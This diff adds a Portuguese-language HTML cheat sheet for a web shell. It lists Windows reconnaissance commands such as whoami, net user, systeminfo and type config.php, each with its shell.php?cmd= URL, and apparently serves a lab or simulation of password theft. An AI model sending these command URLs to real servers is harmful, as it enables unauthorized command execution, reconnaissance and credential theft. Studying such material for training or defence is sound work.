@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <table>
+  <thead>
+    <tr>
+      <th>Comando</th>
+      <th>URL de Acesso</th>
+      <th>Descrição</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>whoami</code></td>
+      <td><code>shell.php?cmd=whoami</code></td>
+      <td>Exibe o nome do usuário que está executando o servidor (ex: SYSTEM, Apache, etc.)</td>
+    </tr>
+    <tr>
+      <td><code>dir</code></td>
+      <td><code>shell.php?cmd=dir</code></td>
+      <td>Lista os arquivos e pastas do diretório atual</td>
+    </tr>
+    <tr>
+      <td><code>cd .. && dir</code></td>
+      <td><code>shell.php?cmd=cd .. && dir</code></td>
+      <td>Sobe um nível no diretório e lista os arquivos</td>
+    </tr>
+    <tr>
+      <td><code>type config.php</code></td>
+      <td><code>shell.php?cmd=type config.php</code></td>
+      <td>Exibe o conteúdo de um arquivo de texto, útil para simular roubo de senhas</td>
+    </tr>
+    <tr>
+      <td><code>tasklist</code></td>
+      <td><code>shell.php?cmd=tasklist</code></td>
+      <td>Mostra todos os processos em execução no sistema</td>
+    </tr>
+    <tr>
+      <td><code>echo %USERNAME%</code></td>
+      <td><code>shell.php?cmd=echo %USERNAME%</code></td>
+      <td>Exibe o nome do usuário atual no Windows</td>
+    </tr>
+    <tr>
+      <td><code>net user</code></td>
+      <td><code>shell.php?cmd=net user</code></td>
+      <td>Lista todos os usuários cadastrados no sistema</td>
+    </tr>
+    <tr>
+      <td><code>systeminfo</code></td>
+      <td><code>shell.php?cmd=systeminfo</code></td>
+      <td>Mostra informações completas do sistema (Windows version, memória, nome da máquina, etc.)</td>
+    </tr>
+  </tbody>
+</table>
+  
+</body>
+</html>
